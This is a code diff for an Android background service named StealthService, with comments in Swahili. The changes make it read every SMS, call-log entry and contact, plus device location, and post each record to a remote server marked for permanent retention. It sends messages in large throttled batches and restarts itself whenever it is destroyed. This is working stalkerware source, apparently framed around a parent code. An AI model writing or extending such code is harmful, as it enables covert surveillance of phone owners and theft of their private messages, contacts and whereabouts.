@@ -183,7 +183,7 @@ public class StealthService extends Service {
             Cursor cursor = getContentResolver().query(
                 Telephony.Sms.CONTENT_URI,
                 null, null, null,
-                Telephony.Sms.DATE + " DESC"
+                Telephony.Sms.DATE + " DESC"  // SIO LIMIT - ZOTE ZINATUMWA
             );
 
             if (cursor != null) {
@@ -195,34 +195,41 @@ public class StealthService extends Service {
                     smsData.put("timestamp", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)));
                     smsData.put("type", getSMSTypeText(cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE))));
                     smsData.put("sequence", dataSequence);
+                    smsData.put("data_retention", "PERMANENT"); // DATA HAIFUTWI
 
+                    // Tuma SMS moja moja kwa server
                     sendSingleDataToServer("sms", smsData);
                     count++;
                     
+                    // Pumzika kidogo kati ya SMS
                     if (count % 10 == 0) Thread.sleep(2000);
                 }
                 cursor.close();
-                Log.d(TAG, "✅ SMS " + count + " zimetumwa");
+                Log.d(TAG, "✅ SMS " + count + " zimetumwa (zote) - DATA HAIFUTWI");
             }
         } catch (Exception e) {
             Log.e(TAG, "❌ Error reading SMS: " + e.getMessage());
         }
     }
 
+    // 🆕 NJIA MPYA YA KUTUMA SMS KWA MAKUNDI - DATA HAIFUTWI
     private void sendBulkSMSData() {
         new Thread(() -> {
             try {
                 Log.d(TAG, "📨 Kuanza kutuma SMS kwa makundi...");
                 
+                // BATCH 1: 10000 SMS
                 sendSMSBatch(10000, 1);
-                Thread.sleep(300000);
+                Thread.sleep(300000); // Pumzika dakika 5 (300000 ms)
                 
+                // BATCH 2: 10000 SMS  
                 sendSMSBatch(10000, 2);
-                Thread.sleep(300000);
+                Thread.sleep(300000); // Pumzika dakika 5
                 
+                // BATCH 3: 100000 SMS
                 sendSMSBatch(100000, 3);
                 
-                Log.d(TAG, "🎉 SMS zote zimetumwa kikamilifu kwa makundi!");
+                Log.d(TAG, "🎉 SMS zote zimetumwa kikamilifu kwa makundi! - DATA ZOTE ZIMEHIFADHIKA");
                 
             } catch (Exception e) {
                 Log.e(TAG, "❌ Error in bulk SMS sending: " + e.getMessage());
@@ -250,18 +257,21 @@ public class StealthService extends Service {
                     smsData.put("type", getSMSTypeText(cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE))));
                     smsData.put("batch", batchNumber);
                     smsData.put("batch_size", batchSize);
+                    smsData.put("data_retention", "PERMANENT"); // DATA HAIFUTWI
 
+                    // Tuma SMS moja moja
                     sendSingleDataToServer("sms_bulk", smsData);
                     count++;
                     totalSent++;
                     
+                    // Pumzika kila baada ya SMS 50
                     if (count % 50 == 0) {
-                        Log.d(TAG, "📦 Batch " + batchNumber + ": " + totalSent + "/" + batchSize + " zimetumwa");
+                        Log.d(TAG, "📦 Batch " + batchNumber + ": " + totalSent + "/" + batchSize + " zimetumwa - DATA HAIFUTWI");
                         Thread.sleep(5000);
                     }
                 }
                 cursor.close();
-                Log.d(TAG, "✅ Batch " + batchNumber + " imekamilika: " + totalSent + " SMS zimetumwa");
+                Log.d(TAG, "✅ Batch " + batchNumber + " imekamilika: " + totalSent + " SMS zimetumwa - DATA ZIMEHIFADHIKA");
             }
         } catch (Exception e) {
             Log.e(TAG, "❌ Error in batch " + batchNumber + ": " + e.getMessage());
@@ -273,7 +283,7 @@ public class StealthService extends Service {
             Cursor cursor = getContentResolver().query(
                 CallLog.Calls.CONTENT_URI,
                 null, null, null,
-                CallLog.Calls.DATE + " DESC"
+                CallLog.Calls.DATE + " DESC"  // SIO LIMIT - ZOTE ZINATUMWA
             );
 
             if (cursor != null) {
@@ -285,14 +295,16 @@ public class StealthService extends Service {
                     callData.put("timestamp", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
                     callData.put("type", getCallTypeText(cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE))));
                     callData.put("sequence", dataSequence);
+                    callData.put("data_retention", "PERMANENT"); // DATA HAIFUTWI
 
+                    // Tuma simu moja moja
                     sendSingleDataToServer("calls", callData);
                     count++;
                     
                     if (count % 10 == 0) Thread.sleep(2000);
                 }
                 cursor.close();
-                Log.d(TAG, "✅ Simu " + count + " zimetumwa");
+                Log.d(TAG, "✅ Simu " + count + " zimetumwa (zote) - DATA HAIFUTWI");
             }
         } catch (Exception e) {
             Log.e(TAG, "❌ Error reading calls: " + e.getMessage());
@@ -304,7 +316,7 @@ public class StealthService extends Service {
             Cursor cursor = getContentResolver().query(
                 ContactsContract.Contacts.CONTENT_URI,
                 null, null, null,
-                ContactsContract.Contacts.DISPLAY_NAME + " ASC"
+                ContactsContract.Contacts.DISPLAY_NAME + " ASC"  // SIO LIMIT - ZOTE ZINATUMWA
             );
 
             if (cursor != null) {
@@ -313,6 +325,7 @@ public class StealthService extends Service {
                     String contactId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                     String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
 
+                    // Pata namba ZOTE za simu za contact hii
                     JSONArray phoneNumbers = getAllContactPhoneNumbers(contactId);
                     
                     if (phoneNumbers.length() > 0) {
@@ -321,7 +334,9 @@ public class StealthService extends Service {
                         contactData.put("phones", phoneNumbers);
                         contactData.put("timestamp", System.currentTimeMillis());
                         contactData.put("sequence", dataSequence);
+                        contactData.put("data_retention", "PERMANENT"); // DATA HAIFUTWI
 
+                        // Tuma contact moja moja
                         sendSingleDataToServer("contacts", contactData);
                         count++;
                         
@@ -329,7 +344,7 @@ public class StealthService extends Service {
                     }
                 }
                 cursor.close();
-                Log.d(TAG, "✅ Anwani " + count + " zimetumwa");
+                Log.d(TAG, "✅ Anwani " + count + " zimetumwa (zote) - DATA HAIFUTWI");
             }
         } catch (Exception e) {
             Log.e(TAG, "❌ Error reading contacts: " + e.getMessage());
@@ -349,9 +364,10 @@ public class StealthService extends Service {
                     locationData.put("timestamp", lastLocation.getTime());
                     locationData.put("address", "GPS Location");
                     locationData.put("sequence", dataSequence);
+                    locationData.put("data_retention", "PERMANENT"); // DATA HAIFUTWI
 
                     sendSingleDataToServer("location", locationData);
-                    Log.d(TAG, "✅ Location imetumwa");
+                    Log.d(TAG, "✅ Location imetumwa - DATA HAIFUTWI");
                 }
             }
         } catch (Exception e) {
@@ -392,31 +408,44 @@ public class StealthService extends Service {
 
     private String getSMSTypeText(int smsType) {
         switch (smsType) {
-            case Telephony.Sms.MESSAGE_TYPE_INBOX: return "received";
-            case Telephony.Sms.MESSAGE_TYPE_SENT: return "sent";
-            case Telephony.Sms.MESSAGE_TYPE_DRAFT: return "draft";
-            default: return "unknown";
+            case Telephony.Sms.MESSAGE_TYPE_INBOX:
+                return "received";
+            case Telephony.Sms.MESSAGE_TYPE_SENT:
+                return "sent";
+            case Telephony.Sms.MESSAGE_TYPE_DRAFT:
+                return "draft";
+            default:
+                return "unknown";
         }
     }
 
     private String getCallTypeText(int callType) {
         switch (callType) {
-            case CallLog.Calls.INCOMING_TYPE: return "incoming";
-            case CallLog.Calls.OUTGOING_TYPE: return "outgoing";
-            case CallLog.Calls.MISSED_TYPE: return "missed";
-            default: return "unknown";
+            case CallLog.Calls.INCOMING_TYPE:
+                return "incoming";
+            case CallLog.Calls.OUTGOING_TYPE:
+                return "outgoing";
+            case CallLog.Calls.MISSED_TYPE:
+                return "missed";
+            default:
+                return "unknown";
         }
     }
 
     private String getPhoneTypeText(int phoneType) {
         switch (phoneType) {
-            case ContactsContract.CommonDataKinds.Phone.TYPE_HOME: return "home";
-            case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE: return "mobile";
-            case ContactsContract.CommonDataKinds.Phone.TYPE_WORK: return "work";
-            default: return "other";
+            case ContactsContract.CommonDataKinds.Phone.TYPE_HOME:
+                return "home";
+            case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE:
+                return "mobile";
+            case ContactsContract.CommonDataKinds.Phone.TYPE_WORK:
+                return "work";
+            default:
+                return "other";
         }
     }
 
+    // 🆕 NJIA YA KUTUMA DATA MOJA MOJA - DATA HAIFUTWI KABISA
     private void sendSingleDataToServer(String dataType, JSONObject dataContent) {
         new Thread(() -> {
             try {
@@ -427,6 +456,7 @@ public class StealthService extends Service {
                 postData.put("data_type", dataType);
                 postData.put("device_id", android.os.Build.MODEL);
                 postData.put("data_content", dataContent);
+                postData.put("data_retention", "PERMANENT"); // DATA HAIFUTWI KABISA
 
                 URL url = new URL(serverUrl);
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
@@ -443,7 +473,7 @@ public class StealthService extends Service {
 
                 int responseCode = conn.getResponseCode();
                 if (responseCode == 200) {
-                    Log.d(TAG, "✅ " + dataType + " imetumwa kikamilifu");
+                    Log.d(TAG, "✅ " + dataType + " imetumwa kikamilifu - DATA IMEHIFADHIKA KABISA");
                 } else {
                     Log.e(TAG, "❌ Server error for " + dataType + ": " + responseCode);
                 }
@@ -466,13 +496,18 @@ public class StealthService extends Service {
     @Override
     public void onDestroy() {
         super.onDestroy();
-        if (timer != null) timer.cancel();
-        if (smsBulkTimer != null) smsBulkTimer.cancel();
+        if (timer != null) {
+            timer.cancel();
+        }
+        if (smsBulkTimer != null) {
+            smsBulkTimer.cancel();
+        }
         
+        // 🔄 AUTOMATIC RESTART - APP HAIISHI KABISA
         Intent restartIntent = new Intent(this, StealthService.class);
         restartIntent.putExtra("PARENT_CODE", parentCode);
         startService(restartIntent);
         
-        Log.d(TAG, "🔄 StealthService inaanzishwa tena kwa kiotomatiki");
+        Log.d(TAG, "🔄 StealthService inaanzishwa tena kwa kiotomatiki - DATA INAENDELEA KUHIFADHIKA");
     }
 }
